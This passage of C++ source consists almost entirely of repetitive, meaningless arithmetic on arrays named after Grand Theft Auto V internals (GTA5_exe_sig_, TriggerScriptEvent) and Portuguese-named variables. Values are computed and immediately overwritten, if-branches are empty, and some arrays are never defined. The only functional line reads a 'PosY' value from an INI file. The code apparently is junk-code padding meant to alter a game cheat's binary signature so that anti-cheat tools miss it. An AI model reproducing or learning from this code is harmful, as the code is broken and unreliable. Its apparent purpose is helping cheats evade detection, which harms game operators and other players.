					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				a = 0.0f;
				b = 0.0f;
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (5) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				a = 0.0f;
				b = 0.0f;
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				Spawn.PosY = Extern_Reader::INIFile::Float::LerFloat(buffer, "PosY");

				if (offset > aaaaaa)
				{
					matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
					offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
					offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
					offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = ponteiro * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (matriz[1] > aaaaaa)
				{
					matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
					matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				a = 0.0f;
				b = 0.0f;
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = 0xB2 * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
